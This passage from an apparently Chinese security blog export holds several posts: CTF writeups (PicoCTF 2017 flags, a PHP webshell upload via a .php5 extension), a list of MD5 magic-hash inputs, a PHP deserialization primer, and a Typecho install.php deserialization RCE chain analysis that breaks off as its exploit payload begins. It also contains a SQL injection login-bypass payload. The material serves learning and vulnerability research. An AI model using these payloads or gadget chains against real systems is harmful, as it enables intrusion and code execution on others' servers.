<p>4.WelcomeToMySQL（100）</p>
<p>可以上传文件，上传图片可以，传php的马就会弹窗，从表哥那得知有.php5的这种文件，直接可以上传，传马，在base.php文件中发现username和password，登陆数据库，得到flag。</p>
<p><img src="http://omfp4wyym.bkt.clouddn.com/blog/20170520/171613094.png" alt="mark"></p>
<p>5.</p>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>WriteUp</tag>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>MD5值0e开头的数字和字母字符串</title>
    <url>/2017/04/29/md5-zhi-0e-kai-tou-de-shu-zi-he-zi-mu-zi-fu-chuan/</url>
    <content><![CDATA[<h1 id="MD5值0e开头的数字和字母字符串"><a href="#MD5值0e开头的数字和字母字符串" class="headerlink" title="MD5值0e开头的数字和字母字符串"></a>MD5值0e开头的数字和字母字符串</h1><p>数字：</p>
<pre><code>240610708 0e462097431906509019562988736854
314282422 0e990995504821699494520356953734
571579406 0e972379832854295224118025748221
903251147 0e174510503823932942361353209384
1110242161 0e435874558488625891324861198103
1320830526 0e912095958985483346995414060832
1586264293 0e622743671155995737639662718498
2302756269 0e250566888497473798724426794462
2427435592 0e067696952328669732475498472343
2653531602 0e877487522341544758028810610885
3293867441 0e471001201303602543921144570260
3295421201 0e703870333002232681239618856220
3465814713 0e258631645650999664521705537122
3524854780 0e507419062489887827087815735195
3908336290 0e807624498959190415881248245271
4011627063 0e485805687034439905938362701775
4775635065 0e998212089946640967599450361168
4790555361 0e643442214660994430134492464512
5432453531 0e512318699085881630861890526097
5579679820 0e877622011730221803461740184915
5585393579 0e664357355382305805992765337023
6376552501 0e165886706997482187870215578015
7124129977 0e500007361044747804682122060876
7197546197 0e915188576072469101457315675502
7656486157 0e451569119711843337267091732412</code></pre>
<p>字母：</p>
<pre><code>QLTHNDT 0e405967825401955372549139051580
QNKCDZO 0e830400451993494058024219903391
EEIZDOI 0e782601363539291779881938479162
TUFEPMC 0e839407194569345277863905212547
UTIPEZQ 0e382098788231234954670291303879
UYXFLOI 0e552539585246568817348686838809
IHKFRNS 0e256160682445802696926137988570
PJNPDWY 0e291529052894702774557631701704
ABJIHVY 0e755264355178451322893275696586
DQWRASX 0e742373665639232907775599582643
DYAXWCA 0e424759758842488633464374063001
GEGHBXL 0e248776895502908863709684713578
GGHMVOE 0e362766013028313274586933780773
GZECLQZ 0e537612333747236407713628225676
NWWKITQ 0e763082070976038347657360817689
NOOPCJF 0e818888003657176127862245791911
MAUXXQC 0e478478466848439040434801845361
MMHUWUV 0e701732711630150438129209816536</code></pre>
<p>混合：</p>
<pre><code>s878926199a
0e545993274517709034328855841020
s155964671a
0e342768416822451524974117254469
s214587387a
0e848240448830537924465865611904
s214587387a
0e848240448830537924465865611904
s878926199a
0e545993274517709034328855841020
s1091221200a
0e940624217856561557816327384675</code></pre>
]]></content>
      <tags>
        <tag>websec</tag>
        <tag>note</tag>
      </tags>
  </entry>
  <entry>
    <title>PHP反序列化</title>
    <url>/2017/04/16/php-fan-xu-lie-hua/</url>
    <content><![CDATA[<h1 id="PHP反序列化"><a href="#PHP反序列化" class="headerlink" title="PHP反序列化"></a>PHP反序列化</h1><p>​    php类可能会包含一些特殊的函数叫magic函数，magic函数命名是以符号<code>_</code>开头的，比如<code> __construct, __destruct, __toString, __sleep, __wakeup</code>等等。这些函数在某些情况下会自动调用，比如<code>__construct </code>当一个对象创建时被调用，<code>__destruct</code>当一个对象销毁时被调用，<code>__toString</code>当一个对象被当作一个字符串使用。</p>
<p>​    php允许保存一个对象方便以后重用，这个过程被称为序列化。php 将数据序列化和反序列化其实就用到两个函数，serialize 和unserialize。</p>
<p>​    serialize()        把变量和它们的值编码成文本形式</p>
<p>​    unserialize()   恢复原先变量</p>
<p>一个例子：</p>
<pre><code>&lt;?php   
class User  
&#123;  
    public $age = 0;  
    public $name = &#39;&#39;;  
    public function PrintData()  
    &#123;  
        echo &#39;User &#39; . $this-&gt;name . &#39; is &#39; . $this-&gt;age  
             . &#39; years old. &lt;br /&gt;&#39;;  
    &#125;  
&#125;  
$usr = new User();  
$usr-&gt;age = 20;  
$usr-&gt;name = &#39;John&#39;;  
$usr-&gt;PrintData();  
echo serialize($usr);  
?&gt; </code></pre>
<p>结果是：</p>
<pre><code>O:4:&quot;User&quot;:2:&#123;s:3:&quot;age&quot;;i:20;s:4:&quot;name&quot;;s:4:&quot;John&quot;;&#125;</code></pre>
<p>上面的是序列化后的，O表示对象，4表示对象名User长度，i表示int，s是string。</p>
<blockquote>
<ul>
<li>a - array</li>
<li>b - boolean</li>
<li>d - double</li>
<li>i - integer</li>
<li>o - common object</li>
<li>r - reference</li>
<li>s - string</li>
<li>C - custom object</li>
<li>O - class</li>
<li>N - null</li>
<li>R - pointer reference</li>
<li>U - unicode string</li>
</ul>
</blockquote>
<p>PHP反序列化漏洞</p>
<blockquote>
<p>漏洞的根源在于unserialize()函数的参数可控。如果反序列化对象中存在魔术方法，而且魔术方法中的代码有能够被我们控制，漏洞就这样产生了，根据不同的代码可以导致各种攻击，如代码注入、SQL注入、目录遍历等等。</p>
</blockquote>
<p>参考资料（挺详细）：<a href="http://www.phpgz.com/plus/view.php?aid=131">http://www.phpgz.com/plus/view.php?aid=131</a></p>
<p>几个例题：<a href="http://www.cnblogs.com/test404/p/6486435.html">http://www.cnblogs.com/test404/p/6486435.html</a></p>
]]></content>
      <categories>
        <category>websec</category>
      </categories>
      <tags>
        <tag>websec</tag>
        <tag>PHP反序列化</tag>
      </tags>
  </entry>
  <entry>
    <title>PIL安装找不到python路径问题</title>
    <url>/2017/08/22/pil-an-zhuang-zhao-bu-dao-python-lu-jing-wen-ti/</url>
    <content><![CDATA[<pre><code>#  
# script to register Python 2.0 or later for use with win32all  
# and other extensions that require Python registry settings  
#  
# written by Joakim Loew for Secret Labs AB / PythonWare  
#  
# source:  
# http://www.pythonware.com/products/works/articles/regpy20.htm  
#  
# modified by Valentine Gogichashvili as described in http://www.mail-archive.com/distutils-sig@python.org/msg10512.html  

import sys  

from _winreg import *  

# tweak as necessary  
version = sys.version[:3]  
installpath = sys.prefix  

regpath = &quot;SOFTWARE\\Python\\Pythoncore\\%s\\&quot; % (version)  
installkey = &quot;InstallPath&quot;  
pythonkey = &quot;PythonPath&quot;  
pythonpath = &quot;%s;%s\\Lib\\;%s\\DLLs\\&quot; % (  
    installpath, installpath, installpath  
)  

def RegisterPy():  
    try:  
        reg = OpenKey(HKEY_CURRENT_USER, regpath)  
    except EnvironmentError as e:  
        try:  
            reg = CreateKey(HKEY_CURRENT_USER, regpath)  
            SetValue(reg, installkey, REG_SZ, installpath)  
            SetValue(reg, pythonkey, REG_SZ, pythonpath)  
            CloseKey(reg)  
        except:  
            print &quot;*** Unable to register!&quot;  
            return  
        print &quot;--- Python&quot;, version, &quot;is now registered!&quot;  
        return  
    if (QueryValue(reg, installkey) == installpath and  
        QueryValue(reg, pythonkey) == pythonpath):  
        CloseKey(reg)  
        print &quot;=== Python&quot;, version, &quot;is already registered!&quot;  
        return  
    CloseKey(reg)  
    print &quot;*** Unable to register!&quot;  
    print &quot;*** You probably have another Python installation!&quot;  

if __name__ == &quot;__main__&quot;:  
    RegisterPy()  </code></pre>
<p>运行。</p>
]]></content>
      <tags>
        <tag>other</tag>
      </tags>
  </entry>
  <entry>
    <title>PicoCTF WriteUp</title>
    <url>/2017/08/31/picoctf-writeup/</url>
    <content><![CDATA[<h1 id="PicoCTF-WriteUp"><a href="#PicoCTF-WriteUp" class="headerlink" title="PicoCTF WriteUp"></a>PicoCTF WriteUp</h1><h2 id="Level-1"><a href="#Level-1" class="headerlink" title="Level 1"></a>Level 1</h2><h3 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h3><h4 id="1-Internet-Kitties"><a href="#1-Internet-Kitties" class="headerlink" title="1.Internet Kitties"></a>1.Internet Kitties</h4><blockquote>
<p>I was told there was something at IP shell2017.picoctf.com with port 24369. How do I get there? Do I need a ship for the port?</p>
<p>**** HINTS</p>
<p>Look at using the netcat (nc) command!</p>
<p>To figure out how to use it, you can run “man nc” or “nc -h” on the shell, or search for it on the interwebz</p>
</blockquote>
<p><strong>WriteUp</strong></p>
<pre><code>nc shell2017.picoctf.com 24369</code></pre>
<p><strong>Flag</strong></p>
<pre><code>648defaaba45452729b7179f0603df05</code></pre>
<h4 id="2-Piazza"><a href="#2-Piazza" class="headerlink" title="2.Piazza"></a>2.Piazza</h4><blockquote>
<p>Have questions about pico? You can ask <a href="http://piazza.com/picoctf/spring2017/31337">here</a>. The access code is 31337.</p>
</blockquote>
<p><strong>WriteUp</strong></p>
<pre><code>注册Piazza的picoCTF课程。</code></pre>
<p><strong>Flag</strong></p>
<pre><code>flag&#123;ask_and_hop3fully_we_can_help&#125;</code></pre>
<h4 id="3-Leaf-of-the-Tree"><a href="#3-Leaf-of-the-Tree" class="headerlink" title="3.Leaf of the Tree"></a>3.Leaf of the Tree</h4><blockquote>
<p>We found this annoyingly named directory tree starting at /problems/5da315e9c7f1c9886ea371abee5ae8d0. It would be pretty lame to type out all of those directory names but maybe there is something in there worth finding? And maybe we dont need to type out all those names…? Follow the trunk, using cat and ls!</p>
<p>**** HINTS</p>
<p>Tab completion is a wonderful, wonderful thing</p>
</blockquote>
<p><strong>WriteUp</strong></p>
<pre><code>lanvnal@shell-web:~$ cd /problems/5da315e9c7f1c9886ea371abee5ae8d0    
lanvnal@shell-web:/problems/5da315e9c7f1c9886ea371abee5ae8d0$ find | grep flag
./trunk/trunke655/trunk8845/trunk9942/trunk2d10/trunk55d8/trunke715/trunkb041/flag                lanvnal@shellweb:/problems/5da315e9c7f1c9886ea371abee5ae8d0$cat trunk/trunke655/trunk8845/trunk9942/trunk2d10/trunk55d8/trunke715/trunkb041/flag
42eed2e89ae8b05b56555f65e0ab81aa</code></pre>
<p><strong>Flag</strong></p>
<pre><code>42eed2e89ae8b05b56555f65e0ab81aa</code></pre>
<h4 id="4-looooong"><a href="#4-looooong" class="headerlink" title="4.looooong"></a>4.looooong</h4><blockquote>
<p>I heard you have some “delusions of grandeur” about your typing speed. How fast can you go at shell2017.picoctf.com:59858?</p>
<p>**** HINTS</p>
<p>Use the nc command to connect!</p>
<p>I hear python is a good means (among many) to generate the needed input.</p>
<p>It might help to have multiple windows open</p>
</blockquote>
<p><strong>WriteUp</strong></p>
<p>我的方法(捂脸</p>
<pre><code>print &quot;x&quot; * time
然后复制
（逃</code></pre>
<p>dalao的方法，python</p>
<pre><code class="python">import re
import socket

# Open socket
s = socket.socket()
s.connect((&quot;shell2017.picoctf.com&quot;,44909))

# Receive initial instructions
instructions = s.recv(4096).decode(&quot;utf-8&quot;)
print(instructions)

# Parse instructions
letter = re.search(&quot;&#39;([A-Za-z])&#39; character&quot;, instructions).group(1)
count = int(re.search(&quot;&#39;([0-9]+)&#39; times&quot;, instructions).group(1))
end = re.search(&quot;followed by a single &#39;([a-zA-Z0-9])&#39;&quot;, instructions).group(1)

# Parse reply
reply = (letter * count) + end + &quot;\n&quot;

# Send reply
s.send(reply.encode(&quot;utf-8&quot;))

# Receive reply to reply
print(s.recv(4096).decode(&quot;utf-8&quot;))</code></pre>
<p><strong>Flag</strong></p>
<pre><code>Flag: with_some_recognition_and_training_delusions_become_glimpses_84bb3b369444af45f140fa500f5e54c3</code></pre>
<h4 id="5-Leaf-of-the-Forest"><a href="#5-Leaf-of-the-Forest" class="headerlink" title="5.Leaf of the Forest"></a>5.Leaf of the Forest</h4><blockquote>
<p>We found an even bigger directory tree hiding a flag starting at /problems/db39b5c002d8445dc6d2bbf49a8ccc37. It would be impossible to find the file named flag manually…</p>
<p>**** HINTS</p>
<p>Is there a search function in Linux? Like if I wanted to ‘find’ something…</p>
</blockquote>
<p><strong>WriteUp</strong></p>
<pre><code>lanvnal@shell-web:/problems/5da315e9c7f1c9886ea371abee5ae8d0$ cd /problems/db39b5c002d8445dc6d2bbf49a8ccc37                                 
lanvnal@shell-web:/problems/db39b5c002d8445dc6d2bbf49a8ccc37$ find | grep flag
./forest/treeada53a/trunkb393/trunkb8ea/trunka3c4/trunk639d/trunk324e/trunk0bf8/trunkf462/branchd463/flag
lanvnal@shell-web:/problems/db39b5c002d8445dc6d2bbf49a8ccc37$ cat forest/treeada53a/trunkb393/trunkb8ea/trunka3c4/trunk639d/trunk324e/trunk0bf8/trunkf462/branchd463/flag
c99501b0fe95402ed1c9191102fe1b68l</code></pre>
<p><strong>Flag</strong></p>
<pre><code>c99501b0fe95402ed1c9191102fe1b68l</code></pre>
<h4 id="6-WorldChat"><a href="#6-WorldChat" class="headerlink" title="6.WorldChat"></a>6.WorldChat</h4><blockquote>
<p>We think someone is trying to transmit a flag over WorldChat. Unfortunately, there are so many other people talking that we can’t really keep track of what is going on! Go see if you can find the messenger at shell2017.picoctf.com:48145. Remember to use Ctrl-C to cut the connection if it overwhelms you!</p>
<p>**** HINTS</p>
<p>There are cool command line tools that can filter out lines with specific keywords in them. Check out ‘grep’! You can use the ‘|’ character to put all the output into another process or command (like the grep process)</p>
</blockquote>
<p><strong>WriteUp</strong></p>
<pre><code>nc shell2017.picoctf.com 48145 | grep -E &quot;this is part&quot;</code></pre>
<pre><code>14:02:34 flagperson: this is part 1/8 of the flag - 748a
14:02:35 flagperson: this is part 2/8 of the flag - 3a37
14:02:37 flagperson: this is part 3/8 of the flag - ce62
14:02:38 flagperson: this is part 4/8 of the flag - e537
14:02:42 flagperson: this is part 5/8 of the flag - 4552
14:02:43 flagperson: this is part 6/8 of the flag - c31f
14:02:46 flagperson: this is part 7/8 of the flag - 5319
14:02:48 flagperson: this is part 8/8 of the flag - 30dc
14:02:49 flagperson: this is part 1/8 of the flag - 748a
14:02:50 flagperson: this is part 2/8 of the flag - 3a37
14:02:50 flagperson: this is part 3/8 of the flag - ce62
14:02:55 flagperson: this is part 4/8 of the flag - e537
14:03:02 flagperson: this is part 5/8 of the flag - 4552
14:03:14 flagperson: this is part 6/8 of the flag - c31f
14:03:20 flagperson: this is part 7/8 of the flag - 5319
14:03:26 flagperson: this is part 8/8 of the flag - 30dc
14:03:28 flagperson: this is part 1/8 of the flag - 748a
14:03:29 flagperson: this is part 2/8 of the flag - 3a37
14:03:30 flagperson: this is part 3/8 of the flag - ce62
14:03:31 flagperson: this is part 4/8 of the flag - e537
14:03:32 flagperson: this is part 5/8 of the flag - 4552</code></pre>
<p><strong>Flag</strong></p>
<pre><code>748a3a37ce62e5374552c31f531930dc</code></pre>
<h3 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h3><h4 id="1-What-Is-Web"><a href="#1-What-Is-Web" class="headerlink" title="1.What Is Web"></a>1.What Is Web</h4><blockquote>
<p>Someone told me that <a href="https://en.wikipedia.org/wiki/Tim_Berners-Lee">some guy</a> came up with the “World Wide Web”, using “HTML” and “stuff”. Can you help me figure out what that is? <a href="http://shell2017.picoctf.com:52334/">Website</a>.</p>
<p>**** HINTS</p>
<p>How can you figure out how the webpage is actually built?</p>
</blockquote>
<p><strong>WriteUp</strong></p>
<pre><code>源码--&gt;
&lt;!-- The first part of the flag (there are 3 parts) is fab79c49d9e --&gt;
kacker.css--&gt;
The second part of the flag is 5ba511a0f24 
script.js--&gt;
The final part of the flag is 36308e33e85</code></pre>
<p><strong>Flag</strong></p>
<pre><code>fab79c49d9e5ba511a0f2436308e33e85</code></pre>
<h3 id="FORENSICS"><a href="#FORENSICS" class="headerlink" title="FORENSICS"></a>FORENSICS</h3><h4 id="1-Digital-Camouflage"><a href="#1-Digital-Camouflage" class="headerlink" title="1.Digital Camouflage"></a>1.Digital Camouflage</h4><blockquote>
<p>We need to gain access to some routers. Let’s try and see if we can find the password in the captured network data: <a href="https://webshell2017.picoctf.com/static/24b38c9557c7c1e23957cc68bdae34ef/data.pcap">data.pcap</a>.</p>
<p>**** HINTS</p>
<p>It looks like someone logged in with their password earlier. Where would log in data be located in a network capture?</p>
<p>If you think you found the flag, but it doesn’t work, consider that the data may be encrypted.</p>
</blockquote>
<p><strong>WriteUp</strong></p>
<p>Wireshark分析，找到数据包#122，main.html</p>
<pre><code>HTML Form URL Encoded: application/x-www-form-urlencoded
    Form item: &quot;userid&quot; = &quot;spiveyp&quot;
    Form item: &quot;pswrd&quot; = &quot;S04xWjZQWFZ5OQ==&quot;</code></pre>
<p>Base64解码得到flag。</p>
<p><strong>Flag</strong></p>
<pre><code>KN1Z6PXVy9</code></pre>
<h4 id="2-Special-Agent-User"><a href="#2-Special-Agent-User" class="headerlink" title="2.Special Agent User"></a>2.Special Agent User</h4><blockquote>
<p>We can get into the Administrator’s computer with a browser exploit. But first, we need to figure out what browser they’re using. Perhaps this information is located in a network packet capture we took: <a href="https://webshell2017.picoctf.com/static/497f84833d05996a9f2b17015ed9b360/data.pcap">data.pcap</a>. Enter the browser and version as “BrowserName BrowserVersion”. NOTE: We’re just looking for up to 3 levels of subversions for the browser version (ie. Version 1.2.3 for Version 1.2.3.4) and ignore any 0th subversions (ie. 1.2 for 1.2.0)</p>
<p>** HINTS**</p>
<p>Where can we find information on the browser in networking data? Maybe try <a href="http://www.useragentstring.com./">reading up on user-agent strings</a>.</p>
</blockquote>
<p><strong>WriteUp</strong></p>
<pre><code>找UA
User-Agent: Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.93 Safari/537.36</code></pre>
<p><strong>Flag</strong></p>
<pre><code>Chrome 40.0.2214</code></pre>
<h3 id="CRYPTOGRAPHY"><a href="#CRYPTOGRAPHY" class="headerlink" title="CRYPTOGRAPHY"></a>CRYPTOGRAPHY</h3><h4 id="1-Keyz"><a href="#1-Keyz" class="headerlink" title="1.Keyz"></a>1.Keyz</h4><blockquote>
<p>While webshells are nice, it’d be nice to be able to login directly. To do so, please add your own public key to ~/.ssh/authorized_keys, using the webshell. Make sure to copy it correctly! The key is in the ssh banner, displayed when you login remotely with ssh, to shell2017.picoctf.com</p>
<p>**** HINTS</p>
<p>There are plenty of tutorials out there. This one covers key generation: <a href="https://confluence.atlassian.com/bitbucketserver/creating-ssh-keys-776639788.html">https://confluence.atlassian.com/bitbucketserver/creating-ssh-keys-776639788.html</a></p>
<p>Then, use the web shell to copy/paste it, and use the appropriate tool to ssh to the server using your key</p>
</blockquote>
<p><strong>WriteUp</strong></p>
<p><a href="http://www.laozuo.org/2811.html">http://www.laozuo.org/2811.html</a></p>
<p><strong>Flag</strong></p>
<pre><code>who_needs_pwords_anyways</code></pre>
<h4 id="2-Substitute"><a href="#2-Substitute" class="headerlink" title="2.Substitute"></a>2.Substitute</h4><blockquote>
<p>A wizard (he seemed kinda odd…) handed me <a href="https://webshell2017.picoctf.com/static/44e178de57175cfc0e24f69d21e63f59/cipher.txt">this</a>. Can you figure out what it says?</p>
<p>**** HINTS</p>
<p>There are tools that make this easy this.</p>
</blockquote>
<p><strong>WriteUp</strong></p>
<pre><code class="php+HTML">字母替换
工具解决。
http://quipqiup.com/</code></pre>
<p><strong>Flag</strong></p>
<pre><code>    THE FLAG IS IFONLYMODERNCRYPTOWASLIKETHIS.</code></pre>
<h3 id="MASTER-CHALLENGE"><a href="#MASTER-CHALLENGE" class="headerlink" title="MASTER CHALLENGE"></a>MASTER CHALLENGE</h3><blockquote>
<p>Lazy Dev</p>
<p>I really need to login to this <a href="http://shell2017.picoctf.com:35895/">website</a>, but the developer hasn’t implemented login yet. Can you help?</p>
<p>**** HINTS</p>
<p>Where does the password check actually occur?</p>
<p>Can you interact with the javascript directly?</p>
</blockquote>
<p><strong>WriteUp</strong></p>
<pre><code>看一下源码，js文件中有一段有问题导致总是返回false。
//Validate the password. TBD!
function validate(pword)&#123;
  //TODO: Implement me
  return true;
&#125;

//Make an ajax request to the server
function make_ajax_req(input)&#123;
  var text_response;
  var http_req = new XMLHttpRequest();
  var params = &quot;pword_valid=&quot; + input.toString();
  http_req.open(&quot;POST&quot;, &quot;login&quot;, true);
  http_req.setRequestHeader(&quot;Content-type&quot;, &quot;application/x-www-form-urlencoded&quot;);
  http_req.onreadystatechange = function() &#123;//Call a function when the state changes.
      if(http_req.readyState == 4 &amp;&amp; http_req.status == 200) &#123;
      document.getElementById(&quot;res&quot;).innerHTML = http_req.responseText;
    &#125;
  &#125;
  http_req.send(params);
&#125;

//Called when the user submits the password
function process_password()&#123;
  var pword = document.getElementById(&quot;password&quot;).value;
  var res = validate(pword);
  var server_res = make_ajax_req(res);
&#125;
有问题的就是--&gt;
function validate(pword)&#123;
  //TODO: Implement me
  return true;
&#125;
导致的就是pword_valid=false。（ var params = &quot;pword_valid=&quot; + input.toString();）
F12进行调试，改为true。</code></pre>
<p><strong>Flag</strong></p>
<pre><code>client_side_is_the_dark_sidebde1f567656f8c9b654a1ec24e1ff889</code></pre>
<h2 id="Level-2"><a href="#Level-2" class="headerlink" title="Level 2"></a>Level 2</h2><h3 id="Web-1"><a href="#Web-1" class="headerlink" title="Web"></a>Web</h3><h4 id="1-My-First-SQL"><a href="#1-My-First-SQL" class="headerlink" title="1.My First SQL"></a>1.My First SQL</h4><blockquote>
<p>I really need access to <a href="http://shell2017.picoctf.com:54020/">website</a>, but I forgot my password and there is no reset. Can you help?</p>
<p>**** HINTS</p>
<p>Have you heard about SQL injection?</p>
</blockquote>
<p><strong>WriteUp</strong></p>
<pre><code>payload:
user:1&#39; or &#39;&#39;=&#39;
password:1&#39; or &#39;&#39;=&#39;</code></pre>
<p><strong>Flag</strong></p>
<pre><code>be_careful_what_you_let_people_ask_104d9ea430b41fb4c5560eecc0652111</code></pre>
<h4 id="2-TW-GR-E1-ART"><a href="#2-TW-GR-E1-ART" class="headerlink" title="2.TW_GR_E1_ART"></a>2.TW_GR_E1_ART</h4><blockquote>
<p>Oh, sweet, they made a spinoff game to Toaster Wars! That last room has a lot of flags in it though. I wonder which is the right one…? Check it out <a href="http://shell2017.picoctf.com:55830/">here</a>.</p>
<p>**** HINTS</p>
<p>I think this game is running on a Node.js server. If it’s configured poorly, you may be able to access the server’s source. If my memory serves me correctly, Node servers have a special file that lists dependencies and a start command; maybe you can use that file to figure out where the other files are?</p>
</blockquote>
<h3 id="MISC-1"><a href="#MISC-1" class="headerlink" title="MISC"></a>MISC</h3><h4 id="1-Yarn"><a href="#1-Yarn" class="headerlink" title="1.Yarn"></a>1.Yarn</h4><blockquote>
<p>I was told to use the linux strings command on <a href="https://webshell2017.picoctf.com/static/9adb6ebf01d8755201564dba69bc1a92/yarn">yarn</a>, but it doesn’t work. Can you help? I lost the flag in the binary somewhere, and would like it back</p>
<p>**** HINTS</p>
<p>What does the strings command use to determine if something is a string?</p>
<p>Is there an option to change the length of what strings considers as valid?</p>
</blockquote>
<p><strong>WriteUp</strong></p>
<pre><code>winhex打开可以看到Submit_me_for_I_am_the_flag，这就是flag。
或
linux下执行命令
strings -n 2 -d flag yarn</code></pre>
<p><strong>Flag</strong></p>
<pre><code>Submit_me_for_I_am_the_flag</code></pre>
<p>####2.Mystery Box</p>
<blockquote>
<p>You’ve found a mystery machine with a sticky <a href="https://webshell2017.picoctf.com/static/65c2504106ce38d8c2971ebaada542c7/note.txt">note</a> attached to it! Oh, there’s also this <a href="https://webshell2017.picoctf.com/static/65c2504106ce38d8c2971ebaada542c7/MysteryBox.png">picture</a> of the machine you found.</p>
<p>**** HINTS</p>
<p>It really gets your gears Turing.</p>
<p>I hear there’s something Naval about it.</p>
</blockquote>
<p><strong>WriteUp</strong></p>
<pre><code>Enigma密码机
http://enigma.louisedade.co.uk/enigma.html?m3;b;b123;ALOG;APPP;FH-GL
在线解密</code></pre>
<p><strong>Flag</strong></p>
<pre><code>QUITEPUZZLINGINDEED</code></pre>
]]></content>
      <tags>
        <tag>WriteUp</tag>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>Typecho反序列化漏洞分析</title>
    <url>/2020/03/15/typecho-fan-xu-lie-hua-lou-dong-fen-xi/</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>突然想起了这个漏洞，来分析一下漏洞利用链学习一下</p>
<p><strong>漏洞原因：</strong></p>
<p>程序安装后不会自动删除install.php，install.php中存在反序列化漏洞引发。</p>
<p><strong>测试版本：</strong><a href="https://github.com/typecho/typecho/releases">v1.1-15.5.12-beta</a></p>
<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>在install.php文件中搜索<code>unserialize</code>就能直接找。</p>
<pre><code class="php"> $config = unserialize(base64_decode(Typecho_Cookie::get(&#39;__typecho_config&#39;)));
 Typecho_Cookie::delete(&#39;__typecho_config&#39;);
 $db = new Typecho_Db($config[&#39;adapter&#39;], $config[&#39;prefix&#39;]);</code></pre>
<p>这里反序列化了<code>Typecho_Cookie::get(&#39;__typecho_config&#39;)</code>的内容（base64编码的），跟进Typecho_Cookie的get方法：</p>
<pre><code class="php">    public static function get($key, $default = NULL)
    &#123;
        $key = self::$_prefix . $key;
        $value = isset($_COOKIE[$key]) ? $_COOKIE[$key] : (isset($_POST[$key]) ? $_POST[$key] : $default);
        return is_array($value) ? $default : $value;
    &#125;</code></pre>
<p>这里可以通过cookie或者post的方式传入，传入反序列化的内容就可控了。</p>
<p>然后在下面的代码中刚才反序列化后的config变量作为参数传入了Typecho_Db类中，</p>
<pre><code class="php"> $db = new Typecho_Db($config[&#39;adapter&#39;], $config[&#39;prefix&#39;]);</code></pre>
<p>跟进Typecho_Db类：</p>
<pre><code class="php">public function __construct($adapterName, $prefix = &#39;typecho_&#39;)
    &#123;
        /** 获取适配器名称 */
        $this-&gt;_adapterName = $adapterName;

        /** 数据库适配器 */
        $adapterName = &#39;Typecho_Db_Adapter_&#39; . $adapterName;

        if (!call_user_func(array($adapterName, &#39;isAvailable&#39;))) &#123;
            throw new Typecho_Db_Exception(&quot;Adapter &#123;$adapterName&#125; is not available&quot;);
        &#125;

        $this-&gt;_prefix = $prefix;

        /** 初始化内部变量 */
        $this-&gt;_pool = array();
        $this-&gt;_connectedPool = array();
        $this-&gt;_config = array();

        //实例化适配器对象
        $this-&gt;_adapter = new $adapterName();
    &#125;</code></pre>
<p><code>&#39;Typecho_Db_Adapter_&#39; . $adapterName;</code>这里字符串拼接变量，会触发<code>__toString</code>魔术方法，搜索代码中的toSting函数，在<code>\var\Typecho\Feed.php</code>中定义的<code>__toString</code>方法中：</p>
<pre><code class="php">    public function __toString()
    &#123;
      ......
    foreach ($this-&gt;_items as $item) &#123;
      $content .= &#39;&lt;item&gt;&#39; . self::EOL;
      $content .= &#39;&lt;title&gt;&#39; . htmlspecialchars($item[&#39;title&#39;]) . &#39;&lt;/title&gt;&#39; . self::EOL;
      $content .= &#39;&lt;link&gt;&#39; . $item[&#39;link&#39;] . &#39;&lt;/link&gt;&#39; . self::EOL;
      $content .= &#39;&lt;guid&gt;&#39; . $item[&#39;link&#39;] . &#39;&lt;/guid&gt;&#39; . self::EOL;
      $content .= &#39;&lt;pubDate&gt;&#39; . $this-&gt;dateFormat($item[&#39;date&#39;]) . &#39;&lt;/pubDate&gt;&#39; . self::EOL;
      $content .= &#39;&lt;dc:creator&gt;&#39; . htmlspecialchars($item[&#39;author&#39;]-&gt;screenName) . &#39;&lt;/dc:creator&gt;&#39; . self::EOL;
      ......
</code></pre>
<p><code>$item[&#39;author&#39;]-&gt;screenName</code>这里如果<code>$item[&#39;author&#39;]</code> 是一个对象，且不存在<code>screenName</code>属性时，会自动调用<code>__get</code>魔法函数。</p>
<p>全局搜索<code>__get</code>函数后在结果中跟进看一看，在<code>/var/Typecho/Request.php</code>中的__get方法有如下代码，其调用了自己的get方法：</p>
<pre><code class="php">public function __get($key)
    &#123;
        return $this-&gt;get($key);
        &#125;</code></pre>
<p>get方法如下：</p>
<pre><code class="php">    public function get($key, $default = NULL)
    &#123;
        switch (true) &#123;
            case isset($this-&gt;_params[$key]):
                $value = $this-&gt;_params[$key];
                break;
            case isset(self::$_httpParams[$key]):
                $value = self::$_httpParams[$key];
                break;
            default:
                $value = $default;
                break;
        &#125;

        $value = !is_array($value) &amp;&amp; strlen($value) &gt; 0 ? $value : $default;
        return $this-&gt;_applyFilter($value);
    &#125;</code></pre>
<p>它会给<code>$value</code>赋值，然后调用自己的<code>_applyFilter</code>方法，跟进<code>_applyFilter</code>方法</p>
<pre><code class="php">    private function _applyFilter($value)
    &#123;
        if ($this-&gt;_filter) &#123;
            foreach ($this-&gt;_filter as $filter) &#123;
                $value = is_array($value) ? array_map($filter, $value) :
                call_user_func($filter, $value);
            &#125;

            $this-&gt;_filter = array();
        &#125;

        return $value;
    &#125;</code></pre>
<p><code>$filter, $value</code>都是可控的，可以利用<code>array_map</code>或<code>call_user_func</code>执行代码。</p>
<p>PS：在install.php中要满足如下的条件才会执行反序列化代码：</p>
<pre><code class="php">if (!empty($_GET) || !empty($_POST)) &#123;
    if (empty($_SERVER[&#39;HTTP_REFERER&#39;])) &#123;
        exit;
    &#125;
&lt;?php if (isset($_GET[&#39;finish&#39;])) : ?&gt;
  ......
  &lt;?php elseif (!Typecho_Cookie::get(&#39;__typecho_config&#39;)): ?&gt;
  &lt;?php else : ?&gt;
    unserialize......</code></pre>
<p>确保<code>fisish，__typecho_config</code>有值就可以了,而且要设置referer。</p>
<h2 id="构造payload"><a href="#构造payload" class="headerlink" title="构造payload"></a>构造payload</h2><pre><code class="php">&lt;?php
class Typecho_Feed&#123;
    private $_type = &#39;ATOM 1.0&#39;;
    private $_items = array();
    public function addItem(array $item)&#123;
        $this-&gt;_items[] = $item;
    &#125;
&#125;
class Typecho_Request&#123;
